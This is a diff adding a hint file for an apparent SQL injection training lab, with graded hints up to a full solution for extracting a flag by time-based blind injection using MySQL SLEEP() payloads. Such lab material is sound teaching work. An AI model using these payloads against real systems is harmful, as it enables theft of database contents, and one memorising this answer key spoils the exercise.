@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-06-blind-time",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "The page always looks the same. But there's another channel of information — how long does the server take to respond?"
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "MySQL's SLEEP() function pauses execution. If you can make the query conditionally sleep, the response time becomes your boolean signal. Try: 1 AND SLEEP(3) — does the response take 3 seconds longer?"
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "Use IF() with SLEEP(): 1 AND IF(ASCII(SUBSTRING((SELECT value FROM config LIMIT 1),1,1))>64, SLEEP(2), 0). If the response is delayed by ~2 seconds, the condition is true."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "Write a script: for each character position, binary search the ASCII value using: 1 AND IF(ASCII(SUBSTRING((SELECT value FROM config WHERE name='flag' LIMIT 1),{pos},1))>{mid}, SLEEP(2), 0). Measure response time — if >2s, the character's ASCII value is above mid."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "Python script: 1) Confirm injection: GET /check?id=1 AND SLEEP(2) — if 2s delay, it works. 2) Find flag length: 1 AND IF((SELECT LENGTH(value) FROM config WHERE name='flag')=N, SLEEP(2), 0) — iterate N. 3) For each position, binary search: 1 AND IF(ASCII(SUBSTRING((SELECT value FROM config WHERE name='flag'),{pos},1))>{mid}, SLEEP(2), 0). Response >2s means true (go higher), <2s means false (go lower). Use 1-second threshold for reliability."
+    }
+  ]
+}
